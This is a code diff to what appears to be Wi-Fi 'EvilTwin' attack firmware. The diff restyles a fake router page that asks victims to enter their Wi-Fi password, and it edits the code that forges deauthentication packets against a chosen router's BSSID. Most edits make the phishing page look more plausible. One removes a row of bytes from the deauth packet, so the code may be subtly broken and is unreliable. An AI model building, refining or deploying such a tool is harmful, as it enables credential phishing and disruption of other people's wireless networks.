@@ -41,8 +41,8 @@ const String _baseHTMLStart = R"rawliteral(
   <title>Secure Network Interface</title>
   <style>
     body {
-      background-color: #1c1c1c;
-      color: #33ff33;
+      background-color: #ffffff; /* Change background to white */
+      color: #000000; /* Change text color to black */
       font-family: 'Courier New', Courier, monospace;
       margin: 0;
       padding: 20px;
@@ -68,7 +68,7 @@ const String _baseHTMLStart = R"rawliteral(
       background-color: #333;
     }
     tr:nth-child(even) {
-      background-color: #2a2a2a;
+      background-color: #f2f2f2; /* Light gray for even rows */
     }
     button {
       padding: 8px 16px;
@@ -95,10 +95,11 @@ const String _baseHTMLStart = R"rawliteral(
     input[type="text"], input[type="password"] {
       padding: 8px;
       width: 300px;
-      background-color: #000;
-      color: #33ff33;
+      background-color: #fff; /* White background for input */
+      color: #000; /* Black text for input */
       border: 1px solid #33ff33;
       font-family: 'Courier New', Courier, monospace;
+      font-weight: bold; /* Bold text */
     }
     input[type="submit"] {
       padding: 10px 20px;
@@ -143,7 +144,7 @@ void setup() {
   // Define Web Server Routes
   webServer.on("/", handleIndex);
   webServer.on("/result", handleResult);
-  webServer.on("/admin", handleAdmin);
+  webServer.on("/admin", handleAdmin );
   webServer.onNotFound(handleIndex);
   webServer.begin();
 
@@ -254,7 +255,7 @@ void handleIndex() {
 
     html += "<form method='post' action='/?hotspot=";
     html += hotspot_active ? "stop" : "start";
-    html += "'>";
+    html += " '>";
     html += "<button type='submit'>";
     html += hotspot_active ? "Stop EvilTwin" : "Start EvilTwin";
     html += "</button></form>";
@@ -299,7 +300,7 @@ void handleIndex() {
     } else {
       html += "<h2>Router: '" + _selectedNetwork.ssid + "'</h2>";
       html += "<form action='/' method='post'>";
-      html += "<label for='password'>Enter Wi-Fi Password:</label><br><br>";
+      html += "<label for='password' style='font-weight: bold; color: black;'>Enter Wi-Fi Password:</label><br><br>"; // Bold label
       html += "<input type='password' id='password' name='password' placeholder='Password' minlength='8' required><br><br>";
       html += "<input type='submit' value='Submit'>";
       html += "</form>";
@@ -348,11 +349,10 @@ void loop() {
                                  0xFF, 0xFF, 0xFF, 0xFF, 
                                  0xFF, 0xFF, 0xFF, 0xFF, 
                                  0xFF, 0xFF, 0xFF, 0xFF, 
-                                 0xFF, 0xFF, 0xFF, 0xFF, 
                                  0xFF, 0x00, 0x00, 0x01, 
-                                 0x00};
+                                  0x00};
 
-    // Set BSSID in the deauth packet
+ // Set BSSID in the deauth packet
     memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
     memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
     deauthPacket[24] = 1;
